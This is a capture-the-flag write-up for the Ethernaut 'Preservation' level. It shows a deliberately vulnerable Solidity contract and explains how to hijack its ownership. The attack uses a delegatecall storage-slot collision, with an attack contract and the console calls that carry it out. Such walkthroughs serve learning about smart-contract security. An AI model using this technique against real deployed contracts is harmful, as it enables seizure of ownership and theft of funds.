# Challenge 16

<img src="./images/BigLevel16.svg" alt="16" >

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

Challenge
---
> This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

Solution
---
1. First Look at the contract and we see library and that will delegate by the Preservation contract. Remember Whenever you use `delegatecall` target contract and `delegatecall` contract must have same `storage`. we need to take ownership let's see storage of `Preservation`

```solidity
 address public timeZone1Library; //  slot 0
  address public timeZone2Library; // slot 1
  address public owner;  // slot 2
  uint storedTime; // slot 3
```

owner is at `slot 2`.

Let's Make contract that will same as library contract. Now, remember that when delegateCall() is used, it executes the called function within the context of the calling contract. Our objective is to set owner to our player address, which lives in slot 2 of the Preservation contract.

```solidity
contract PreservationAttack {
    address public timeZone1Library; // slot 0
  address public timeZone2Library; // slot 1
  uint storedTime; // slot 2
    address public owner; // slot 3
  

     function setTime(uint _time) public {
        storedTime = _time;
    }
}
```

First We call 
```js
await contract.setFirstTime(YOUR_ATTACK_ADDRESS);
```

it will store the attack address at slot `0`.

then will make another call but this time with player address (your address).

```js
await contract.setFirstTime(player);
```

it will excute the function and your address will be at slot `2` and check this 

```js
await contract.owner()
```

you will see your address.  now submit the instance your challenge will be cleared.🎉
